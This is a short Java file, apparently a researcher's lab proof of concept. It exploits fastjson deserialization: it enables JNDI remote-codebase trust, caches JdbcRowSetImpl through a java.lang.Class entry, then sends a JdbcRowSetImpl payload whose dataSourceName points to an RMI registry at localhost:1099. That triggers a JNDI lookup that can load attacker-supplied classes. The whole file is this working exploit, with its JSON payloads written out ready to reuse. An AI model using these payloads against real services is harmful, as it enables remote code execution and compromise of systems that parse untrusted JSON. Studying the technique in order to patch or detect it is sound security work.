package com.dmc.rmi;

import com.alibaba.fastjson.JSONObject;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author:dingmc
 * @Description:
 * @Date: Created in 12:19 PM 2019/9/1
 * @Modified By:
 */
public class RMIClient {

    public static void main(String[] args) throws Exception{
//        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
//        TestServiceImpl testService = (TestServiceImpl) registry.lookup("test");
//        testService.test("asd");
//        ReferenceWrapper_Stub wrapper = (ReferenceWrapper_Stub) registry.lookup("xxx");
//        System.out.println(wrapper.getReference().getClassName());
//        System.out.println(System.getProperty("java.rmi.server.useCodebaseOnly"));
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        System.out.println(System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
        try {
            String z = "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}";
            JSONObject.parseObject(z);
        } catch (Exception e) {
            String z1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/xxx\",\"autoCommit\":true}";
            JSONObject.parseObject(z1);
        }

    }
}
